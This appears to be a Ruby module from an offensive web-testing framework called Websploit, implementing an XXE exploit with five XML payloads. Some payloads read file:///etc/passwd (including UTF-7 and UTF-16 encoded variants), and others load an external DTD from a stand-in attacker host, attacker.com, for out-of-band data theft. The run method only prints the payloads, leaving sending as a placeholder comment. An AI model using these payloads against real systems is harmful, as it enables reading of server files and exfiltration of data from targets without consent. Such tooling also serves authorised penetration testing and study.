require_relative '../../core/base_module'

module Websploit
  class XxeExploit < Websploit::BaseModule
    path 'exploit/xxe'

    register_option 'TARGET', default: '', required: true, description: 'Target URL'
    register_option 'METHOD', default: 'POST', required: false, description: 'HTTP Method (GET/POST)'
    register_option 'CONTENT_TYPE', default: 'application/xml', required: false, description: 'Content-Type header'

    def run
      target = options["TARGET"][:current]
      method = options["METHOD"][:current]
      content_type = options["CONTENT_TYPE"][:current]

      puts "[*] Testing XXE on #{target}"
      puts "[*] Method: #{method}"
      puts "[*] Content-Type: #{content_type}"

      # Lista de payloads XXE
      payloads = [
        # Basic XXE
        <<~XML,
          <?xml version="1.0" encoding="ISO-8859-1"?>
          <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
          <foo>&xxe;</foo>
        XML

        # XXE with parameter entities
        <<~XML,
          <?xml version="1.0" encoding="ISO-8859-1"?>
          <!DOCTYPE foo [
            <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
            %xxe;]>
          <foo>&evil;</foo>
        XML

        # XXE with CDATA
        <<~XML,
          <?xml version="1.0" encoding="ISO-8859-1"?>
          <!DOCTYPE foo [
            <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
            %xxe;]>
          <foo><![CDATA[&evil;]]></foo>
        XML

        # XXE with UTF-7
        <<~XML,
          +ADw?xml version=+ACI1.0+ACI encoding=+ACIUTF-7+ACI?+AD4-
          +ADw!DOCTYPE foo+AFs-
          +ADw!ENTITY xxe SYSTEM +ACIfile:///etc/passwd+ACI+AD4+AD4-
          +ADwfoo+AD4AJxxe+ADsAPA-/foo+AD4-
        XML

        # XXE with UTF-16
        <<~XML,
          <?xml version="1.0" encoding="UTF-16"?>
          <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
          <foo>&xxe;</foo>
        XML
      ]

      payloads.each do |payload|
        puts "[*] Testing payload:"
        puts payload
        # Implementação do teste XXE aqui
      end
    end
  end
end 